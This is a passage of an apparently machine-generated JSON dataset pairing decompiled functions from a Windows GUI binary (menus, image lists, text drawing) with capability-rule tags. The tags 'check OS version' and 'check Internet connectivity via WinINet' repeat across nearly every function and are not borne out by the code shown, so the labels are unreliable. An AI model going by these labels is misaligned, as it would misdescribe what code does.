0x446b28;\n    uStack52 = fcn.00446840();\n    sub.comctl32.dll_ImageList_Add();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x446b4e;\n    uStack48 = 0x446b46;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 536
    },
    "00446ea8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446ea8(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.0044666c();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.00421984();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.00422d1c();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.00421f4c();\n            fcn.0041d0bc();\n            fcn.00412730(&var_28h, *(in_EAX + 0x30));\n            fcn.00421f4c(&var_28h);\n            fcn.0041d460();\n            fcn.00421f4c(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.0041d804();\n            uVar2 = fcn.00446840(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00412730(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.00421f4c();\n            var_8h = fcn.0041d804();\n            fcn.0041d0bc();\n            uVar2 = fcn.0041d804();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.0041d0bc();\n            uVar2 = fcn.0041d804();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.00446468(arg_ch);\n            fcn.00446e80(uVar2);\n            uVar2 = fcn.00446468();\n            uVar2 = fcn.0041d804(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.00446840(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 788
    },
    "004476a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004476a0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.00446b64();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004033e4();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.004475b0(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 136
    },
    "00447754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00447754(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x447771;\n    var_4h = in_EAX;\n    fcn.004159e8();\n    puStack84 = 0x447780;\n    fcn.004159e8();\n    puStack84 = 0x44778c;\n    var_8h = fcn.00421984();\n    uStack88 = 0x4479d8;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.004157bc();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x4477bf;\n    fcn.004157dc(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x4477cb;\n    var_10h = fcn.00421984();\n    uStack108 = 0x4479bb;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.00421984();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.00421984();\n    fcn.00422d1c();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00412730(&fcn.00447754::var_30h, *(var_4h + 0x30));\n    fcn.00447d80();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.00412758(&fcn.00447754::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.00447754::var_40h;\n                    uVar2 = fcn.00421f4c();\n                    fcn.00421f4c(uVar2);\n                    fcn.0041d32c(puVar3);\n                    fcn.00412758(&fcn.00447754::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.00447754::var_40h;\n                    uVar2 = fcn.00421f4c();\n                    fcn.00421f4c(uVar2);\n                    fcn.0041d32c(puVar3);\n                    fcn.0044697c();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00403258();\n    fcn.00403258();\n    fcn.00447d84();\n    return;\n}\n",
        "token_count": 1032
    },
    "00447c3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00447c3c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x463b98 == 0) {\n        *0x463b98 = fcn.0040bd88();\n        if (0x5ffff < *0x463b98) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x463b9c = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x447c9b;\n    iVar1 = fcn.0041a014(0);\n    uStack44 = 0x447d36;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x463b9c == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.00446840(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040b5f4();\n            fcn.004039e4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.00446840(1, iVar1);\n        iVar1 = (**0x463b9c)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040b5f4();\n            fcn.004039e4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x447d3d;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 480
    },
    "00447d84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00447d84(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.00403454();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00448e3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00448fb7)\n// WARNING: Removing unreachable block (ram,0x00448fc4)\n// WARNING: Removing unreachable block (ram,0x00448fd1)\n// WARNING: Removing unreachable block (ram,0x00448fd7)\n// WARNING: Removing unreachable block (ram,0x00448fe4)\n// WARNING: Removing unreachable block (ram,0x00448fea)\n// WARNING: Removing unreachable block (ram,0x00448ff7)\n\nvoid fcn.00448e3c(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00448e3c::var_2h + 2;\n    uStack32 = 0x449025;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (in_AL < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404040();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404040();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404040();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404040();\n            goto code_r0x00448fb1;\n        }\n    }\n    else if (in_AL < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404040();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404190();\n            goto code_r0x00448fb1;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00404190();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00404190();\n            goto code_r0x00448fb1;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00448e3c::var_2h + 2;\n            fcn.00407e50();\n            fcn.004042b4();\n            goto code_r0x00448fb1;\n        }\n    }\n    puStack28 = &fcn.00448e3c::var_2h + 2;\n    fcn.00448de8();\ncode_r0x00448fb1:\n    fcn.00403fa8();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44902c;\n    uStack32 = 0x449024;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 910
    },
    "0044909c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044909c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4490b5;\n    fcn.00404458();\n    uStack32 = 0x449177;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00449040();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00449040();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00449040(),  cVar1 != '\\0')) || (cVar1 = fcn.00449040(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar3 = 8;\n        do {\n            fcn.00448e3c();\n            iVar2 = fcn.00407ce0();\n            if (iVar2 == 0) break;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != 0x256);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44917e;\n    uStack32 = 0x449176;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 363
    },
    "004491b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004491b4(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t *piVar2;\n    code *in_ECX;\n    int32_t in_EDX;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = in_EAX;\n    if (in_EDX != 0) {\n        var_9h = 0;\n        while (var_9h == 0) {\n            piVar2 = fcn.0044b754();\n            if (piVar2 <= *in_EAX) break;\n            uVar1 = fcn.0044b764();\n            piVar2 = uVar1 & 0xffffff00;\n            if (*(arg_8h + -1) <= *(uVar1 + 0x3f) && *(uVar1 + 0x3f) != *(arg_8h + -1)) break;\n            piVar2 = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n            var_9h = piVar2;\n        }\n    }\n    return piVar2 & 0xffffff00 | var_9h;\n}\n",
        "token_count": 288
    },
    "00449214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00449214(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.0044b754();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.0044b754();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.0044b764();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.0044b764();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.004491b4(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.004491b4(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.0044b764(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.0044b764(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "004496a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004496a8(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00449194();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00403228();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x44c0b8;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 336
    },
    "004497d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004497d8(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff84;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint lpmi;\n    uint var_35h;\n    uint32_t var_31h;\n    uint32_t var_2dh;\n    uint32_t var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_15h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack84 = &var_1h + 1;\n    var_8h = 0;\n    uStack88 = 0x449a33;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack92;\n    puVar1 = &var_1h + 1;\n    var_1h._0_1_ = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x00449a15;\n    fcn.00404040();\n    iVar4 = fcn.0044b754();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004033e4();\n                if (cVar3 != '\\0') goto code_r0x00449874;\n            }\n            fcn.00448e3c(0x449a4c, var_8h);\n            fcn.00404328(0);\n        }\n    }\n    else {\n        var_25h = fcn.00449ce8();\n    }\ncode_r0x00449874:\n    uVar2 = sub.kernel32.dll_GetVersion_1();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.004043b4();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x461c5c) |\n                *(*(in_EAX + 0x48) * 4 + 0x461c50) | *(*(in_EAX + 0x38) * 4 + 0x461c40) |\n                *(*(in_EAX + 0x39) * 4 + 0x461c48);\n        iVar4 = fcn.0044b754();\n        if (iVar4 < 1) {\n            uVar5 = fcn.00404468();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff84 = param_2;\n            puVar1 = puStack84;\n        }\n        else {\n            uVar5 = fcn.00404468();\n            uVar5 = fcn.00449ce8(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff84 = param_2;\n            puVar1 = puStack84;\n        }\n        goto code_r0x00449a15;\n    }\n    lpmi = 0x2c;\n    var_35h = 0x3f;\n    iVar4 = fcn.0044bd10();\n    if (iVar4 == 0) {\ncode_r0x004498b4:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x004498ca;\n        }\n        var_9h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.0044b32c();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x004498b4;\n        }\ncode_r0x004498ca:\n        var_9h = 1;\n    }\n    fcn.004043b4();\n    var_31h = *((uVar2 & 0x7f) * 4 + 0x461c90) | *(*(in_EAX + 0x3d) * 4 + 0x461c88) | *(*(in_EAX + 0x48) * 4 + 0x461c64)\n              | *(var_1h * 4 + 0x461c98) | *(var_9h * 4 + 0x461ca0);\n    var_2dh = *(*(in_EAX + 0x38) * 4 + 0x461c70) | *(*(in_EAX + 0x39) * 4 + 0x461c80) |\n              *(*(in_EAX + 0x3a) * 4 + 0x461c78);\n    var_29h = *(in_EAX + 0x50);\n    var_25h = 0;\n    var_21h = 0;\n    var_1dh = 0;\n    var_15h = fcn.00404468();\n    iVar4 = fcn.0044b754();\n    if (0 < iVar4) {\n        var_25h = fcn.00449ce8();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff84 = param_2;\n    puVar1 = puStack84;\ncode_r0x00449a15:\n    puStack84 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff84;\n    fcn.00403fa8(0x449a3a);\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 1495
    },
    "00449bb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00449bb8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.00449bb8();\n        return;\n    }\n    uVar2 = fcn.00449ce8();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.00449ce8(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.00449ce8(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004033e4(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.00449ce8();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x00449c78;\n        }\n    }\n    fcn.00449a78();\ncode_r0x00449c78:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 474
    },
    "00449ce8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00449ce8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.00448d90();\n        }\n        fcn.00449a78();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 189
    },
    "00449d78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00449dc4)\n// WARNING: Removing unreachable block (ram,0x00449dce)\n\nvoid __cdecl fcn.00449d78(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = NULL;\n    uStack52 = 0x449f5c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.0044bd10();\n    if ((iVar2 != 0) && (cVar1 = fcn.0044d34c(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.00404040();\n    uVar5 = (arg_8h & 0x400) == 0;\n    if ((!uVar5) &&\n       ((uVar5 = var_ch == NULL,  uVar5 || ((uVar5 = *var_ch == '&',  uVar5 && (uVar5 = var_ch[1] == '\\0',  uVar5))))))\n    {\n        fcn.00404270();\n    }\n    fcn.004043b4();\n    if (uVar5) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.0041d804(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x00449f46;\n    }\n    fcn.0041d1d8();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.0041cbb0();\n        fcn.0041cbbc();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.0041c8f0();\n            uVar3 = fcn.00404268(lprc, arg_8h);\n            uVar3 = fcn.00404468(uVar3);\n            uVar3 = fcn.0041d804(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        else {\n            iVar2 = fcn.0041c430();\n            iVar4 = fcn.0041c430();\n            if (iVar2 == iVar4) {\n                fcn.0041c8f0();\n                goto code_r0x00449f21;\n            }\n        }\n        fcn.0041c8f0();\n    }\ncode_r0x00449f21:\n    uVar3 = fcn.00404268(lprc, arg_8h);\n    uVar3 = fcn.00404468(uVar3);\n    uStackY120 = fcn.0041d804(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x00449f46:\n    *in_FS_OFFSET = uStackY120;\n    fcn.00403fa8(0x449f63);\n    